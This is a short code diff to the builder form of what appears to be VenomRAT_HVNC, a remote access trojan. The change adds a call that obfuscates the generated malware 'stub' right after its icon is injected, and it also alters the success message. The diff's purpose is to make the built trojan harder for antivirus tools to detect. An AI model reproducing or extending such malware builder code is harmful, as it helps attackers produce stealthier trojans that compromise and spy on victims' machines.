@@ -7,6 +7,7 @@ using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Windows.Forms;
+using Client.Obfuscation;
 using dnlib.DotNet;
 using dnlib.DotNet.Emit;
 using Guna.UI2.WinForms;
@@ -250,7 +251,8 @@ namespace VenomRAT_HVNC.Server.Forms
                                 {
                                     IconInjector.InjectIcon(saveFileDialog.FileName, txtIcon.Text);
                                 }
-                                MessageBox.Show("Stub Successfully build!", "Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
+                                Obfuscate.Run(saveFileDialog.FileName);
+                                MessageBox.Show(@"Stub Successfully build!", @"Builder", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                                 SaveSettings();
                                 Close();
                             }
